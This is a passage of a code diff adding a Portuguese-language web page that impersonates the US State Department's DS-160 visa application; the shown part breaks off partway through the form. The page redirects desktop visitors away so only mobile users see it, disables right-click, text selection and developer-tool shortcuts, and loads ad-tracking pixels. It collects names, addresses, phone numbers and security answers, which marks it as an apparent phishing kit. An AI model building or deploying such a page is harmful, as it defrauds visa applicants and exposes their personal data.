@@ -1,0 +1,1294 @@
+<!DOCTYPE html><html lang="pt"><head>
+    <script async="" src="js/fbevents.js"></script><script type="text/javascript">
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+          window.location.href = 'https://dogwifcoin.org/';
+        }
+     </script>
+     
+        <script type="text/javascript">
+        var message="Desculpe, o clique com o botão direito foi desativado.";
+        function clickIE() {if (document.all) {(message);return false;}}
+        function clickNS(e) {if
+        (document.layers||(document.getElementById&&!document.all)) {
+            if (e.which==2||e.which==3) {(message);return false;}}}
+        if (document.layers)
+        {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+        else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+        document.oncontextmenu=new Function("return false")
+        </script>
+        
+        <script>
+        document.onkeydown = function(e) {
+            if(event.keyCode == 123) {
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+                return false;
+            }
+        }
+        </script>
+        
+        <script>
+        function disableselect(e) {
+            return false;
+        }
+        
+        function reEnable() {
+            return true;
+        }
+        
+        document.onselectstart = new Function("return false");
+        
+        if (window.sidebar) {
+            document.onmousedown = disableselect;
+            document.onclick = reEnable;
+        }
+        </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulário de Visto DS-160</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        function enviarSolicitacao() {
+    // Redireciona para a página desejada
+    window.location.href = 'assinatura.html';  // Substitua 'nova-pagina.html' pelo caminho da sua página
+}
+
+        // Função para voltar para a segunda etapa a partir da terceira etapa
+function voltarParaSegundaEtapa() {
+    document.getElementById('terceira-etapa').style.display = 'none';
+    document.getElementById('segunda-etapa').style.display = 'block';
+}
+
+// Função para voltar para a terceira etapa a partir da quarta etapa
+function voltarParaTerceiraEtapa() {
+    document.getElementById('quarta-etapa').style.display = 'none';
+    document.getElementById('terceira-etapa').style.display = 'block';
+}
+
+// Função para voltar para a quarta etapa a partir da quinta etapa
+function voltarParaQuartaEtapa() {
+    document.getElementById('quinta-etapa').style.display = 'none';
+    document.getElementById('quarta-etapa').style.display = 'block';
+}
+
+// Função para voltar para a quinta etapa a partir da sexta etapa
+function voltarParaQuintaEtapa() {
+    document.getElementById('sexta-etapa').style.display = 'none';
+    document.getElementById('quinta-etapa').style.display = 'block';
+}
+
+// Função para voltar para a sexta etapa a partir da sétima etapa
+function voltarParaSextaEtapa() {
+    document.getElementById('setima-etapa').style.display = 'none';
+    document.getElementById('sexta-etapa').style.display = 'block';
+}
+
+// Função para voltar para a sétima etapa a partir da oitava etapa
+function voltarParaSetimaEtapa() {
+    document.getElementById('oitava-etapa').style.display = 'none';
+    document.getElementById('setima-etapa').style.display = 'block';
+}
+
+// Função para voltar para a oitava etapa a partir da nona etapa
+function voltarParaOitavaEtapa() {
+    document.getElementById('nona-etapa').style.display = 'none';
+    document.getElementById('oitava-etapa').style.display = 'block';
+}
+
+// Função para voltar para a nona etapa a partir da etapa 10
+function voltarParaNonaEtapa() {
+    document.getElementById('etapa-10').style.display = 'none';
+    document.getElementById('nona-etapa').style.display = 'block';
+}
+
+// Função para voltar para a etapa 10 a partir da etapa 11
+function voltarParaEtapa10() {
+    document.getElementById('etapa-11').style.display = 'none';
+    document.getElementById('etapa-10').style.display = 'block';
+}
+
+// Função para voltar para a etapa 11 a partir da etapa 12
+function voltarParaEtapa11() {
+    document.getElementById('etapa-12').style.display = 'none';
+    document.getElementById('etapa-11').style.display = 'block';
+}
+
+// Função para voltar para a etapa 12 a partir da etapa 13
+function voltarParaEtapa12() {
+    document.getElementById('etapa-13').style.display = 'none';
+    document.getElementById('etapa-12').style.display = 'block';
+}
+
+// Função para voltar para a etapa 13 a partir da etapa 14
+function voltarParaEtapa13() {
+    document.getElementById('etapa-14').style.display = 'none';
+    document.getElementById('etapa-13').style.display = 'block';
+}
+
+// Função para voltar para a etapa 14 a partir da etapa 15
+function voltarParaEtapa14() {
+    document.getElementById('etapa-15').style.display = 'none';
+    document.getElementById('etapa-14').style.display = 'block';
+}
+
+// Função para voltar para a etapa 15 a partir da etapa 16
+function voltarParaEtapa15() {
+    document.getElementById('etapa-16').style.display = 'none';
+    document.getElementById('etapa-15').style.display = 'block';
+}
+
+// Função para voltar para a etapa 16 a partir da etapa 17, 18, 19
+function voltarParaEtapa16() {
+    document.getElementById('decima-setima-oitava-nona-etapa').style.display = 'none';
+    document.getElementById('etapa-16').style.display = 'block';
+}
+
+// Função para voltar para a etapa 17, 18, 19 a partir da etapa 20
+function voltarParaDecimaSetimaOitavaNonaEtapa() {
+    document.getElementById('vigesima-etapa').style.display = 'none';
+    document.getElementById('decima-setima-oitava-nona-etapa').style.display = 'block';
+}
+
+// Função para voltar para a etapa 20 a partir da etapa 21
+function voltarParaEtapa20() {
+    document.getElementById('vigesima-primeira-etapa').style.display = 'none';
+    document.getElementById('vigesima-etapa').style.display = 'block';
+}
+
+        // Função para exibir a segunda etapa ao clicar em "Iniciar Aplicação"
+        function iniciarAplicacao() {
+            document.getElementById('primeira-etapa').style.display = 'none';
+            document.getElementById('segunda-etapa').style.display = 'block';
+        }
+
+        // Função para validar a caixa de seleção de concordância na segunda etapa
+        function prosseguirParaProximaEtapa() {
+            const isAgreed = document.getElementById('agree').checked;
+            if (isAgreed) {
+                alert('Você concordou e agora pode prosseguir para a próxima etapa.');
+                document.getElementById('segunda-etapa').style.display = 'none';
+                document.getElementById('terceira-etapa').style.display = 'block';
+            } else {
+                alert('Você deve concordar com os termos antes de prosseguir.');
+            }
+        }
+
+        // Funções para ir para as próximas etapas
+        function irParaQuartaEtapa() {
+            document.getElementById('terceira-etapa').style.display = 'none';
+            document.getElementById('quarta-etapa').style.display = 'block';
+            document.getElementById('application-id-banner').style.display = 'block';
+        }
+
+        function irParaQuintaEtapa() {
+            document.getElementById('quarta-etapa').style.display = 'none';
+            document.getElementById('quinta-etapa').style.display = 'block';
+        }
+
+        function irParaSextaEtapa() {
+            document.getElementById('quinta-etapa').style.display = 'none';
+            document.getElementById('sexta-etapa').style.display = 'block';
+        }
+
+        function irParaSetimaEtapa() {
+            document.getElementById('sexta-etapa').style.display = 'none';
+            document.getElementById('setima-etapa').style.display = 'block';
+        }
+
+        function irParaOitavaEtapa() {
+            document.getElementById('setima-etapa').style.display = 'none';
+            document.getElementById('oitava-etapa').style.display = 'block';
+        }
+
+        function irParaNonaEtapa() {
+            document.getElementById('oitava-etapa').style.display = 'none';
+            document.getElementById('nona-etapa').style.display = 'block';
+        }
+
+        function irParaEtapa10() {
+            document.getElementById('nona-etapa').style.display = 'none';
+            document.getElementById('etapa-10').style.display = 'block';
+        }
+
+        function irParaEtapa11() {
+            document.getElementById('etapa-10').style.display = 'none';
+            document.getElementById('etapa-11').style.display = 'block';
+        }
+
+        function irParaEtapa12() {
+            document.getElementById('etapa-11').style.display = 'none';
+            document.getElementById('etapa-12').style.display = 'block';
+        }
+
+        function irParaEtapa13() {
+            document.getElementById('etapa-12').style.display = 'none';
+            document.getElementById('etapa-13').style.display = 'block';
+        }
+
+        function irParaEtapa14() {
+            document.getElementById('etapa-13').style.display = 'none';
+            document.getElementById('etapa-14').style.display = 'block';
+        }
+
+        function irParaEtapa15() {
+            document.getElementById('etapa-14').style.display = 'none';
+            document.getElementById('etapa-15').style.display = 'block';
+        }
+
+        function irParaEtapa16() {
+            document.getElementById('etapa-15').style.display = 'none';
+            document.getElementById('etapa-16').style.display = 'block';
+        }
+
+        function irParaDecimaSetimaOitavaNonaEtapa() {
+            document.getElementById('etapa-16').style.display = 'none';
+            document.getElementById('decima-setima-oitava-nona-etapa').style.display = 'block';
+        }
+
+        function irParaEtapa20() {
+            document.getElementById('decima-setima-oitava-nona-etapa').style.display = 'none';
+            document.getElementById('vigesima-etapa').style.display = 'block';
+        }
+
+        function irParaEtapa21() {
+    // Captura os dados da quarta etapa
+    capturarDadosPessoais();
+
+    // Exibir os dados na etapa de revisão (Etapa 21)
+    document.getElementById('sobrenomes-revisao').textContent = sobrenomes || "Não fornecido";
+    document.getElementById('nomes-dados-revisao').textContent = nomesDados || "Não fornecido";
+    document.getElementById('endereco-revisao').textContent = endereco || "Não fornecido";
+    document.getElementById('telefone-revisao').textContent = telefone || "Não fornecido";
+    document.getElementById('genero-revisao').textContent = genero || "Não fornecido";
+
+    // Esconder a Etapa 20
+    document.getElementById('vigesima-etapa').style.display = 'none';
+
+    // Mostrar a Etapa 21
+    document.getElementById('vigesima-primeira-etapa').style.display = 'block';
+}
+
+function capturarDadosPessoais() {
+    // Pegando os valores dos inputs e armazenando nas variáveis
+    sobrenomes = document.getElementById('sobrenomes').value;
+    nomesDados = document.getElementById('nomes-dados').value;
+    endereco = document.getElementById('endereco').value;
+    telefone = document.getElementById('telefone').value;
+    // Capturando o gênero selecionado
+    const generoSelecionado = document.querySelector('input[name="genero"]:checked');
+    genero = generoSelecionado ? generoSelecionado.value : null;
+}
+
+        // Função para inicializar a terceira etapa com Application ID e data
+        function inicializarTerceiraEtapa() {
+            const applicationID = gerarApplicationID();
+            const dataAtual = exibirDataAtual();
+            document.getElementById('application-id').textContent = applicationID;
+            document.getElementById('data-atual').textContent = dataAtual;
+            document.getElementById('application-id-banner').textContent = applicationID; // Exibir na quarta etapa
+        }
+
+        // Função para gerar o Application ID
+        function gerarApplicationID() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let id = 'AA';
+            for (let i = 0; i < 7; i++) {
+                id += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return id;
+        }
+
+        // Função para formatar e exibir a data atual
+        function exibirDataAtual() {
+            const hoje = new Date();
+            const meses = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"];
+            const dia = String(hoje.getDate()).padStart(2, '0');
+            const mes = meses[hoje.getMonth()];
+            const ano = hoje.getFullYear();
+            return `${dia}-${mes}-${ano}`;
+        }
+
+        // Função para inicializar a terceira etapa quando a página carregar
+        window.onload = function() {
+            inicializarTerceiraEtapa();
+            document.getElementById('application-id-banner').style.display = 'none'; // Esconder até a quarta etapa
+        };
+    </script>
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1238265364044087');
+    fbq('track', 'PageView');
+    </script><script async="" defer="" src="js/pixel.js"></script></head>
+
+    <body class="bg-gray-100"><noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1238265364044087&ev=PageView&noscript=1"
+    /></noscript>
+    <script>
+        window.pixelId = "67243e70e257ad639df7c22c";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+      </script>
+
+    <!-- Top Bar Section -->
+    <header class="bg-blue-900 p-0 relative">
+        <div class="container mx-auto">
+            <img src="images/banner.png" alt="Banner do Departamento de Estado" class="w-full h-auto md:h-40 min-h-[100px] md:min-h-[150px]">
+            <div class="absolute top-0 right-0 m-4">
+                <select class="bg-transparent text-white p-1 border border-gray-300 rounded">
+                    <option>Português</option>
+                    <option>Inglês</option>
+                    <option>Espanhol</option>
+                </select>
+            </div>
+        </div>
+    </header>
+
+    <!-- Application ID Banner -->
+    <div id="application-id-banner" class="container mx-auto mt-4 text-right text-red-600 font-bold" style="display: none;">AAMZ68U97</div>
+
+    <!-- Primeira Etapa -->
+    <section id="primeira-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg">
+        <h2 class="text-xl font-bold text-blue-900">Aplicação para Visto de Não-Imigrante (DS-160)</h2>
+        <p class="text-red-500 mt-2">Idioma da Dica de Ferramenta: Português</p>
+
+        <div class="mt-6">
+            <h3 class="text-lg font-semibold text-gray-800">Bem-vindo!</h3>
+            <p class="text-gray-700">O primeiro passo na aplicação de um visto de não-imigrante dos EUA é completar sua aplicação.</p>
+        </div>
+
+        <div class="mt-6">
+            <h3 class="text-lg font-semibold text-gray-800">Antes de Você Começar:</h3>
+            <ol class="list-decimal list-inside text-gray-700 mt-2">
+                <li><a href="#" class="text-blue-600 underline">Aprenda sobre Tipos de Vistos</a>.</li>
+                <li>Este site é projetado para ser acessado usando <b>Google Chrome, Safari</b> somente.</li>
+                <li>Reúna seus documentos.</li>
+                <li><a href="#" class="text-blue-600 underline">Revise as instruções e FAQ</a>.</li>
+            </ol>
+        </div>
+
+        <div class="mt-6">
+            <h3 class="text-lg font-semibold text-gray-800">Notas:</h3>
+            <p class="text-gray-700">Outras pessoas podem ajudar você com sua aplicação de visto. Mesmo que outra pessoa tenha ajudado a completar a aplicação, você deve assinar.</p>
+        </div>
+
+        <div class="mt-6">
+            <label class="block text-gray-700">Selecione um local onde você está aplicando para o visto:</label>
+            <select class="mt-2 block w-full border border-gray-300 p-2 rounded">
+                <option>Acre</option>
+                <option>Alagoas</option>
+                <option>Amapá</option>
+                <option>Amazonas</option>
+                <option>Bahia</option>
+                <option>Ceará</option>
+                <option>Distrito Federal</option>
+                <option>Espírito Santo</option>
+                <option>Goiás</option>
+                <option>Maranhão</option>
+                <option>Mato Grosso</option>
+                <option>Mato Grosso do Sul</option>
+                <option>Minas Gerais</option>
+                <option>Pará</option>
+                <option>Paraíba</option>
+                <option>Paraná</option>
+                <option>Pernambuco</option>
+                <option>Piauí</option>
+                <option>Rio de Janeiro</option>
+                <option>Rio Grande do Norte</option>
+                <option>Rio Grande do Sul</option>
+                <option>Rondônia</option>
+                <option>Roraima</option>
+                <option>Santa Catarina</option>
+                <option>São Paulo</option>
+                <option>Sergipe</option>
+                <option>Tocantins</option>
+            </select>
+        </div>
+
+        <div class="mt-6 flex flex-col gap-4 md:flex-row justify-between">
+            <button onclick="iniciarAplicacao()" class="bg-red-600 text-white w-full md:w-auto px-6 py-2 rounded font-bold text-sm">INICIAR UMA APLICAÇÃO</button>
+            <button class="bg-red-600 text-white w-full md:w-auto px-6 py-2 rounded font-bold text-sm">RECUPERAR UMA APLICAÇÃO</button>
+        </div>
+    </section>
+
+    <!-- Segunda Etapa -->
+    <section id="segunda-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Notificações sobre Fraude e Abuso no Uso do Sistema</h2>
+        <p class="mt-4 text-gray-800 leading-relaxed">
+            Para a administração do site, informações são coletadas para fins estatísticos. O Departamento de Estado utiliza programas de software para criar estatísticas resumidas para fins como avaliar quais informações são de maior ou menor interesse ou identificar desempenho do sistema ou áreas problemáticas.
+        </p>
+        <p class="mt-4 text-gray-800 leading-relaxed">
+            Para fins de segurança do site e para garantir que este serviço permaneça disponível para todos os usuários, o Departamento de Estado utiliza programas de software para monitorar o tráfego da rede a fim de identificar tentativas não autorizadas de carregar ou alterar informações ou, de outra forma, causar danos.
+        </p>
+        <div class="mt-6">
+            <input type="checkbox" id="agree" name="agree" class="mr-2">
+            <label for="agree" class="text-gray-800">EU CONCORDO</label>
+        </div>
+        <div class="mt-6">
+            <button class="bg-blue-900 text-white px-6 py-2 rounded" onclick="prosseguirParaProximaEtapa()">Prosseguir</button>
+        </div>
+    </section>
+
+    <!-- Terceira Etapa -->
+    <section id="terceira-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações da Aplicação</h2>
+        <p class="mt-4 text-gray-800 leading-relaxed">
+            Registre seu Application ID em um local seguro. Você precisará dele para recuperar sua aplicação.
+        </p>
+        <p class="mt-4 text-gray-800 leading-relaxed">
+            Se houver problemas técnicos com o sistema, ou você quiser completar sua aplicação em outro momento, poderá salvar seu progresso e continuar de onde parou. 
+        </p>
+        <div class="mt-4 p-4 bg-gray-200 rounded">
+            <p><strong>ID da sua Aplicação: </strong><span id="application-id">AAMZ68U97</span></p>
+            <p><strong>Data: </strong><span id="data-atual">01-NOV-2024</span></p>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Pergunta de Segurança</label>
+            <select class="mt-2 block w-full border border-gray-300 p-2 rounded">
+                <option>Qual é o nome de solteira da sua mãe?</option>
+                <option>Qual foi o nome do seu primeiro animal de estimação?</option>
+                <option>Em que cidade você nasceu?</option>
+                <option>Qual é o nome da sua escola primária?</option>
+            </select>
+            <label class="block text-gray-700 mt-4">Resposta</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite sua resposta">
+        </div>
+        <div class="mt-6 flex justify-between">
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaQuartaEtapa()">Continuar</button>
+            <button class="bg-gray-500 text-white px-4 py-2 rounded">Cancelar</button>
+        </div>
+    </section>
+
+    <!-- Quarta Etapa - Informações Pessoais -->
+<section id="quarta-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+    <h2 class="text-xl font-bold text-blue-900">Informações Pessoais 1</h2>
+
+    <div class="mt-6">
+        <label class="block text-gray-700">Sobrenomes:</label>
+        <input type="text" id="sobrenomes" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="(ex: FERNANDEZ GARCIA)">
+    </div>
+
+    <div class="mt-6">
+        <label class="block text-gray-700">Nome(s) Dados:</label>
+        <input type="text" id="nomes-dados" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="(ex: JUAN MIGUEL)">
+    </div>
+
+    <!-- Adicionando o campo Endereço -->
+    <div class="mt-6">
+        <label class="block text-gray-700">Endereço:</label>
+        <input type="text" id="endereco" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o seu endereço">
+    </div>
+
+    <!-- Adicionando o campo Telefone -->
+    <div class="mt-6">
+        <label class="block text-gray-700">Telefone:</label>
+        <input type="text" id="telefone" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o seu telefone">
+    </div>
+
+    <!-- Adicionando o campo Gênero -->
+    <div class="mt-6">
+        <label class="block text-gray-700">Gênero:</label>
+        <div class="mt-2">
+            <input type="radio" id="masculino" name="genero" value="Masculino" class="mr-2">
+            <label for="masculino" class="text-gray-700">Masculino</label>
+            <input type="radio" id="feminino" name="genero" value="Feminino" class="ml-4 mr-2">
+            <label for="feminino" class="text-gray-700">Feminino</label>
+        </div>
+    </div>
+
+    <!-- Mantendo a pergunta sobre outros nomes -->
+    <div class="mt-6">
+        <label class="block text-gray-700">Você já usou outros nomes (ex: nome de solteira, etc.)?</label>
+        <div class="mt-2">
+            <input type="radio" id="sim-outros-nomes" name="outros-nomes" class="mr-2">
+            <label for="sim-outros-nomes" class="text-gray-700">Sim</label>
+        </div>
+        <div class="mt-2">
+            <input type="radio" id="nao-outros-nomes" name="outros-nomes" class="mr-2">
+            <label for="nao-outros-nomes" class="text-gray-700">Não</label>
+        </div>
+    </div>
+
+    <div class="mt-6 flex justify-between">
+        <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaQuintaEtapa()">Continuar</button>
+        <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaTerceiraEtapa()">Voltar</button>
+    </div>
+</section>
+
+    <!-- Quinta Etapa -->
+    <section id="quinta-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações de Viagem</h2>
+
+        <div class="mt-6">
+            <label class="block text-gray-700">Motivo da Viagem para os EUA:</label>
+            <select class="mt-2 block w-full border border-gray-300 p-2 rounded">
+                <option>Negócios e Turismo (B1/B2)</option>
+                <option>Estudo (F1)</option>
+                <option>Trabalho (H1B)</option>
+            </select>
+        </div>
+
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já fez planos de viagem específicos?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-planos" name="planos-viagem" class="mr-2">
+                <label for="sim-planos" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-planos" name="planos-viagem" class="ml-4 mr-2">
+                <label for="nao-planos" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <div class="mt-6">
+            <label class="block text-gray-700">Data prevista de chegada:</label>
+            <input type="date" class="mt-2 block w-full border border-gray-300 p-2 rounded">
+        </div>
+
+        <div class="mt-6">
+            <label class="block text-gray-700">Duração prevista da estadia nos EUA:</label>
+            <input type="number" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Número de dias">
+        </div>
+
+        <div class="mt-6">
+            <label class="block text-gray-700">Local onde você ficará nos EUA:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Endereço nos EUA">
+        </div>
+
+        <div class="mt-6">
+            <label class="block text-gray-700">Quem pagará pela sua viagem?</label>
+            <select class="mt-2 block w-full border border-gray-300 p-2 rounded">
+                <option>Eu mesmo</option>
+                <option>Empresa</option>
+                <option>Outro</option>
+            </select>
+        </div>
+
+        <div class="mt-6 flex justify-between">
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaSextaEtapa()">Continuar</button>
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaQuartaEtapa()">Voltar</button>
+        </div>
+    </section>
+
+    <!-- Sexta Etapa -->
+    <section id="sexta-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações sobre Companheiros de Viagem</h2>
+        <div class="mt-6">
+            <label class="block text-gray-700">Há outras pessoas viajando com você?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-companheiros" name="companheiros-viagem" class="mr-2">
+                <label for="sim-companheiros" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-companheiros" name="companheiros-viagem" class="ml-4 mr-2">
+                <label for="nao-companheiros" class="text-gray-700">Não</label>
+            </div>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Você está viajando como parte de um grupo ou organização?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-grupo" name="grupo-viagem" class="mr-2">
+                <label for="sim-grupo" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-grupo" name="grupo-viagem" class="ml-4 mr-2">
+                <label for="nao-grupo" class="text-gray-700">Não</label>
+            </div>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Nome das Pessoas Viajando com Você:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Nome completo">
+        </div>
+        <div class="mt-6 flex justify-between">
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaSetimaEtapa()">Continuar</button>
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaQuintaEtapa()">Voltar</button>
+        </div>
+    </section>
+
+    <!-- Sétima Etapa -->
+    <section id="setima-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações sobre Viagens Anteriores aos EUA</h2>
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já esteve nos EUA?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-esteve-eua" name="esteve-eua" class="mr-2">
+                <label for="sim-esteve-eua" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-esteve-eua" name="esteve-eua" class="ml-4 mr-2">
+                <label for="nao-esteve-eua" class="text-gray-700">Não</label>
+            </div>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já teve um visto dos EUA?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-visto-eua" name="visto-eua" class="mr-2">
+                <label for="sim-visto-eua" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-visto-eua" name="visto-eua" class="ml-4 mr-2">
+                <label for="nao-visto-eua" class="text-gray-700">Não</label>
+            </div>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já teve um visto recusado ou retirou sua solicitação?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-visto-recusa" name="visto-recusa" class="mr-2">
+                <label for="sim-visto-recusa" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-visto-recusa" name="visto-recusa" class="ml-4 mr-2">
+                <label for="nao-visto-recusa" class="text-gray-700">Não</label>
+            </div>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Já foi enviada uma petição de imigrante em seu nome?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-peticao-imigrante" name="peticao-imigrante" class="mr-2">
+                <label for="sim-peticao-imigrante" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-peticao-imigrante" name="peticao-imigrante" class="ml-4 mr-2">
+                <label for="nao-peticao-imigrante" class="text-gray-700">Não</label>
+            </div>
+        </div>
+        <div class="mt-6 flex justify-between">
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaOitavaEtapa()">Continuar</button>
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaSextaEtapa()">Voltar</button>
+        </div>
+    </section>
+
+    <!-- Oitava Etapa -->
+    <section id="oitava-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Endereço e Telefone</h2>
+        <div class="mt-6">
+            <label class="block text-gray-700">Endereço Residencial (Linha 1):</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o endereço">
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Endereço Residencial (Linha 2) <span class="text-gray-500">(Opcional)</span>:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded">
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Cidade:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite a cidade">
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Estado/Província:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded">
+        </div>
+        <div class="mt-2">
+            <input type="checkbox" id="nao-aplica-estado" class="mr-2">
+            <label for="nao-aplica-estado" class="text-gray-700">Não se Aplica</label>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">CEP:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o código postal">
+        </div>
+        <div class="mt-2">
+            <input type="checkbox" id="nao-aplica-cep" class="mr-2">
+            <label for="nao-aplica-cep" class="text-gray-700">Não se Aplica</label>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">País/Região:</label>
+            <select class="mt-2 block w-full border border-gray-300 p-2 rounded">
+                <option>Selecione...</option>
+                <option>Brasil</option>
+                <option>Estados Unidos</option>
+                <option>Canadá</option>
+            </select>
+        </div>
+
+        <!-- Endereço de Correspondência -->
+        <div class="mt-6">
+            <label class="block text-gray-700">O endereço de correspondência é o mesmo que o residencial?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-endereco-correspondencia" name="endereco-correspondencia" class="mr-2">
+                <label for="sim-endereco-correspondencia" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-endereco-correspondencia" name="endereco-correspondencia" class="ml-4 mr-2">
+                <label for="nao-endereco-correspondencia" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Telefone -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Número de Telefone Primário:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded">
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Número de Telefone Secundário <span class="text-gray-500">(Opcional)</span>:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded">
+        </div>
+        <div class="mt-2">
+            <input type="checkbox" id="nao-aplica-secundario" class="mr-2">
+            <label for="nao-aplica-secundario" class="text-gray-700">Não se Aplica</label>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Número de Telefone Comercial <span class="text-gray-500">(Opcional)</span>:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded">
+        </div>
+        <div class="mt-2">
+            <input type="checkbox" id="nao-aplica-comercial" class="mr-2">
+            <label for="nao-aplica-comercial" class="text-gray-700">Não se Aplica</label>
+        </div>
+        <div class="mt-6 flex justify-between">
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaNonaEtapa()">Continuar</button>
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaSetimaEtapa()">Voltar</button>
+        </div>
+    </section>
+
+    <!-- Nona Etapa -->
+    <section id="nona-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações de Contato nos EUA</h2>
+        <p class="mt-4 text-gray-800">Pessoa ou Organização de Contato nos Estados Unidos</p>
+
+        <!-- Sobrenomes -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Sobrenomes:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite os sobrenomes">
+            <div class="mt-2">
+                <input type="checkbox" id="nao-sei-sobrenome" class="mr-2">
+                <label for="nao-sei-sobrenome" class="text-gray-700">Não Sei</label>
+            </div>
